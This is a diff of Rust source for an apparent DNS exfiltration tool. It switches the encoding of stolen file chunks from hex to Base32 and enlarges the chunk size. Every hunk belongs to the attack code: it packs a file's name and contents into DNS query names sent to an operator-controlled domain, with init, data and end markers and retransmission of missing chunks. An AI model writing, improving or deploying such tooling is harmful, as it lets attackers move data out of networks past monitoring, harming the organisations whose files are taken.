@@ -1,5 +1,6 @@
 use crate::error::DnsexError;
 use crate::handler::ChunkFlag;
+use data_encoding::BASE32_NOPAD;
 use hickory_client::client::{AsyncClient, ClientHandle};
 use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
 use hickory_proto::udp::UdpClientStream;
@@ -11,7 +12,7 @@ use std::str::FromStr;
 use tokio::net::UdpSocket as TokioUdpSocket;
 use tokio::time::{Duration, sleep};
 
-const CHUNK_SIZE: usize = 30;
+const CHUNK_SIZE: usize = 39;
 
 #[derive(Clone, Debug)]
 pub struct ExfilPayload {
@@ -43,11 +44,8 @@ impl Client {
         format!("{:04x}", n)
     }
 
-    fn build_fqdn(&self, hex_data: &str, seq: usize, id: &str, flags: u32) -> String {
-        format!(
-            "{}.{}.{}.{}.{}",
-            hex_data, seq, id, flags, self.config.domain
-        )
+    fn build_fqdn(&self, data: &str, seq: usize, id: &str, flags: u32) -> String {
+        format!("{}.{}.{}.{}.{}", data, seq, id, flags, self.config.domain)
     }
 
     async fn get_client(&self) -> Result<AsyncClient, DnsexError> {
@@ -71,7 +69,7 @@ impl Client {
         total_chunks: usize,
     ) -> Result<(), DnsexError> {
         let init_fqdn = self.build_fqdn(
-            &hex::encode(filename),
+            &BASE32_NOPAD.encode(filename.as_bytes()),
             total_chunks,
             session_id,
             ChunkFlag::Init as u32,
@@ -89,8 +87,12 @@ impl Client {
         total_chunks: usize,
     ) -> Result<(), DnsexError> {
         for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
-            let data_fqdn =
-                self.build_fqdn(&hex::encode(chunk), seq, session_id, ChunkFlag::Data as u32);
+            let data_fqdn = self.build_fqdn(
+                &BASE32_NOPAD.encode(chunk),
+                seq,
+                session_id,
+                ChunkFlag::Data as u32,
+            );
 
             if self.config.progress {
                 let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
@@ -125,7 +127,13 @@ impl Client {
             ChunkFlag::Fin as u32
         };
 
-        let fin_fqdn = self.build_fqdn(&hex::encode("EOF"), total_chunks, session_id, flags);
+        let fin_fqdn = self.build_fqdn(
+            &BASE32_NOPAD.encode("EOF".as_bytes()),
+            total_chunks,
+            session_id,
+            flags,
+        );
+
         let responses = self.send_query(client, &fin_fqdn).await?;
         let mut missing: Vec<usize> = Vec::new();
 
@@ -155,7 +163,7 @@ impl Client {
         for &seq in missing {
             if seq < chunks.len() {
                 let data_fqdn = self.build_fqdn(
-                    &hex::encode(chunks[seq]),
+                    &BASE32_NOPAD.encode(chunks[seq]),
                     seq,
                     session_id,
                     ChunkFlag::Data as u32,
